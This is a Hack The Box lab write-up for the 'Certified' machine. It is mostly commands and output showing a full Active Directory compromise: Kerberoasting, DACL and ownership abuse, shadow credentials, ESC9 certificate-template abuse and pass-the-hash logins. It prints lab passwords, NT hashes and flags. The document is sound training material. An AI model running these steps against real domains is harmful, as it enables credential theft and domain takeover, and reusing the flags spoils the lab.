### 📄 HTB: [Machine Name: Certified]

**Challenge Details**

- **Category:** [[CyberSecurity]], [[Active Directory]], [[Privilege Escalation]], [[PKI Abuse]]
    
- **Difficulty:** Hard
    
- **Target:** Certified (IP: 10.129.231.186)
    
- **Status:** #solved
    
- **Date Completed:** [[2025-11-21]]
    
- **Initial Credentials:** `judith.mader:judith09`
    

---

### 🎯 Objective

This write-up documents the methodology used to compromise the `Certified` Active Directory environment, starting with low-privileged domain credentials. The process involved Kerberoasting to find a service account, exploiting an Active Directory Certificate Services (AD CS) vulnerability (ESC8/ESC9) to gain administrator rights, and ultimately achieving **Domain Admin** privileges.

---

### 🕵️ Initial Access & Reconnaissance

#### Port Scan & Initial Enumeration

## 1. Initial Access & Enumeration

|**Detail**|**Value**|
|---|---|
|**Initial User**|`judith.mader`|
|**Initial Password**|`judith09`|
|**Target IP**|`$target`|
|**Domain Controller**|`DC01`|
|**OS**|Windows 10 / Server 2019 Build 17763 x64|

### Nmap and Time Sync

Bash

```
# Nmap Scans
nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt

# Time Synchronization
sudo rdate -n $target
# Output: Fri Nov 21 20:50:04 AEDT 2025
```

### SMB Enumeration (NetExec)

Bash

```
# Share Enumeration
netexec smb $target -u 'judith.mader' -p 'judith09' --shares
# Key Output Snippet:
# SMB           10.129.231.186  445   DC01              [+] certified.htb\judith.mader:judith09 
# SMB           10.129.231.186  445   DC01              Share           Permissions     Remark
# ...
# SMB           10.129.231.186  445   DC01              NETLOGON        READ            Logon server share 
# SMB           10.129.231.186  445   DC01              SYSVOL          READ            Logon server share 

# User Enumeration
netexec smb $target -u 'judith.mader' -p 'judith09' --users | awk '{print$5}' |fgrep -v '[*]' | tee users2
# User List: Administrator, Guest, krbtgt, judith.mader, management_svc, ca_operator, alexander.huges, harry.wilson, gregory.cameron
```

### Kerberos Checks

Bash

```
# AS-REPRoast Check
impacket-GetNPUsers certified.htb/ -dc-ip $target -usersfile users2 -format john
# Output: [-] User judith.mader doesn't have UF_DONT_REQUIRE_PREAUTH set (No vulnerable users found)

# Kerberoast Check
impacket-GetUserSPNs -dc-ip $target 'certified.htb/judith.mader:judith09' -request
# Key Output Snippet:
# ServicePrincipalName            Name            MemberOf                                   PasswordLastSet             LastLogon  Delegation 
# --------------------------------- --------------  ------------------------------------------  --------------------------  ---------  ----------
# certified.htb/management_svc.DC01 management_svc  CN=Management,CN=Users,DC=certified,DC=htb  2024-05-14 01:30:51.476756  <never>    

# Kerberoast Hash (Uncrackable)
# $krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$68c81d84f1b3993ca9f5ac3f9ac5d783$fba11e4cb7fb3c59f7a42d74639b32b7f3fbb7b7c52305176d66a47a4c05435edc52026b3c04ae166836db4b0e48b13fb950595690065ddb840a8c9e8e4420d5339d8ff337bd7197a2181ba272ed60d9216e35cf2b70d013d48b3063d94db272eb768392f73521c55cc60955673fd9caccbaf78b531a3203d972b15bf95e8e67ea725684b48815300ea4d15267c6ad4ed7bb112a16ceef4f764649891e97adaccd08d9532ca23c6cf081c6a059d7583e841198d1599ead2171fdccde3a52ac87e62749472a3078cdc3dfcb71b87150fdbeabe06560574940c9027cf2368121933daa59ef90ea918b08f2f2188ec3370c9912697d7f2cb887efca55c0870967703032a9cff08d6128c79f11af7c56ec0894e18ca6bea791c56e14e3a971595d37ee6e8ffe3a07c0c62eac1c6051823de0d82902f46d74128bd517a649857995fa86014b3720b919a96988f6ef411d83d0d6fd50a5c38a13d9a7159a19ab4ec6a97ca10a7503945b6a63decb2c284e3eae64db54533a6bbe815178c7ca660bd992287070d9a32c9f11e0ec55fe2050f11c1e1afe3da47dc9dd103cf8128ccb31cb02a4f6f7dbd7befa815a0bf9da78717c6e86119a3a328b715b73112a2929209eed9387c568d6b1c44b62cc6cc9efdcac5c81d2c6d6de45b4b0e8440defc7bfa5543524192d8e1f5875135782ebb8d0bc8d5512bcd2c890c551749eabc6513afe4546e6b4bb412066d905337c22f41a9222af3f4580df0c7d546088778c6d482f1d42f8cdb0212a55d2533dbe7102de3bd92b28c4d91fe62dc5d115832e00c583f8a825863a8e968348d2bea3e2d481cd8be6a7950a530327ea1bdb4cd6d94b7313e51315b0e71a3ca550669156ed5c546862db1812c22f2b02e6c88951dc25337de8d0e15b29e9f653d1274b14f5c9d48c889ae302f437bc03c60f962031614188b72623bf45fa0c65edb9ea84639d7485ae215d972790b28dfe31c54e90565d4b12b05ef8ae90f5e00a9abc661173980d93510dcbec1cfbe3885f7491a17354b101ad2408fb054aedb8ad7fd22a9299bf1795d098419ba07d3ad4f714baadfb6551e9ecc0c00030be1f6e22dfcc28b7ae59091fb687ee8687e757ad6596fde6babf9ffd626ecb95d5ac72d98c8b3095a30dcc70afcebb5ef5d659adc741dd6eb4241c529ff81a1c77e2f05a7442c192e0c4575c816ecd8c978c71365359afedfa5315c90f46e8893ed352ebf4a5ad9e57b11f054431c4c4980ddf4cb6e5e8dae3c3b50337c7bbeede19a5370ac7a4fd5d6f7a7c2d975d47322f3e6926f76394dc060c9e1138280d4203adb0755c78ee7208e2bc3ffe0075dd0eb76c529f401e53b5f8d7bfa5f645d6d3bab298fd628cbeadeb98a514c0ecb5290147e2d346b879ac896d4f46bd34458bc251fc54220484397fa6c722ea93fe0a9ac3af1052dc1a2e4abcab4dcee9c6e9a739fbeb25c7304854491600dcedc8deac7921fcdabb067f97610212c9b1b9d733c188e89f414b6f2a8281bd50a745ca730bf5ba4c09280f1d66a87feb16ac0336c06a161dd18781b8f9f8ce91dd41da
```

---

## 2. Lateral Movement to `management_svc` (User Flag)

### BloodHound Setup and ACL Abuse

Bash

```
# BloodHound Setup
curl -L https://ghst.ly/getbhce -o docker-compose.yml
sudo docker-compose pull && sudo docker-compose up -d
sudo docker-compose logs bloodhound | grep -i passw

# Ingest Data
netexec ldap $target -u '' -p '' --bloodhound --collection All --dns-server $target
```

**Goal:** Modify the **`Management`** group (which contains `management_svc`) using the permissions granted to `judith.mader`.

### Group Modification (DACLEdit)

Bash

```
# Take Ownership of 'Management' group (Output shows 'Domain Admins' as previous owner)
impacket-owneredit -action write -new-owner 'judith.mader' -target 'Management' 'certified.htb'/'judith.mader:judith09'
# Output: [*] OwnerSid modified successfully!

# Grant WriteMembers right to judith.mader
impacket-dacledit -action write -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader:judith09' 
# Output: [*] DACL modified successfully!

# Add judith.mader to the Management group
net rpc group addmem "Management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S $target

# Verify membership
net rpc group members "Management" -U "certified.htb"/"judith.mader"%"judith09" -S $target
# Output:
# CERTIFIED\judith.mader
# CERTIFIED\management_svc
```

### Shadow Credentials (Certipy)

Bash

```
# Certipy Environment Setup (As you recorded it)
python3 -m venv certipy_env_new
source certipy_env_new/bin/activate
sudo apt update && sudo apt install python3-dev libkrb5-dev gcc -y
pip install certipy-ad

# Execute Shadow Credentials attack to get management_svc hash
certipy shadow auto -u judith.mader@certified.htb -p 'judith09' -account management_svc
# Key Output Snippet:
# [*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

### User Flag Acquisition

Bash

```
evil-winrm -i $target -u management_svc -H a091c1832bcdd4677c28b5a6a1295584

# Inside WinRM shell:
*Evil-WinRM* PS C:\Users\management_svc\desktop> type user.txt
# Output: 3cadf7d2219c8a28d4cf313ff26251cb
```

---

## 3. Domain Admin Compromise (AD CS Abuse)

### Privilege Escalation to `ca_operator`

Using the newly acquired `management_svc` hash to compromise `ca_operator`.

Bash

```
certipy shadow auto -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator
# Key Output Snippet:
# [*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```

### AD CS Enumeration and Vulnerability

Bash

```
# Find vulnerable templates with ca_operator privileges
certipy-ad find -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip $target -stdout -vulnerable
# Key Output Snippet (Vulnerable Template):
# Template Name: CertifiedAuthentication
# Certificate Name Flag: SubjectAltRequireUpn
# Enrollment Flag: NoSecurityExtension (ESC9)
# Enrollment Rights: CERTIFIED.HTB\operator ca
```

### ESC8/ESC9 Attack

The attack proceeds by modifying the `ca_operator` UPN, requesting the malicious certificate, and then restoring the UPN, all using the hashes obtained.

1. **Read current UPN (Optional but good for verification)**
    
    Bash
    
    ```
    certipy-ad account -u 'management_svc@certified.htb' -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip $target -user 'ca_operator' read
    # Output: userPrincipalName: ca_operator@certified.htb
    ```
    
2. **Update `ca_operator` UPN to `administrator`** (using `management_svc` hash to write)
    
    Bash
    
    ```
    certipy-ad account -u 'management_svc@certified.htb' -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip $target -upn 'administrator' -user 'ca_operator' update
    # Output: [*] Successfully updated 'ca_operator'
    ```
    
3. Request Certificate as Administrator (using ca_operator hash to enroll)
    
    You used the below command which successfully generated the certificate based on the updated UPN.
    
    Bash
    
    ```
    certipy-ad req -u 'ca_operator' -hashes b4b86f45c6018f1b664f70805f45d8f2 -dc-ip $target -target 'DC01.certified.htb' -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'
    # Output: [*] Wrote certificate and private key to 'administrator.pfx'
    ```
    
4. **Restore Original UPN** (Cleanup)
    
    Bash
    
    ```
    certipy-ad account -u 'management_svc@certified.htb' -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip $target -upn 'ca_operator@certified.htb' -user 'ca_operator' update
    # Output: [*] Successfully updated 'ca_operator'
    ```
    
5. **Authenticate and Get Administrator Hash**
    
    Bash
    
    ```
    certipy-ad auth -dc-ip $target -pfx administrator.pfx -username 'administrator' -domain 'certified.htb'
    # Key Output Snippet:
    # [*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
    ```
    

### Root Flag Acquisition

Bash

```
evil-winrm -u administrator -H 0d5b49608bbce1751f708748f67e2d34 -i $target

# Inside WinRM shell:
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
# Output: ef4014ca7ff368474f662602e59c6dde
```
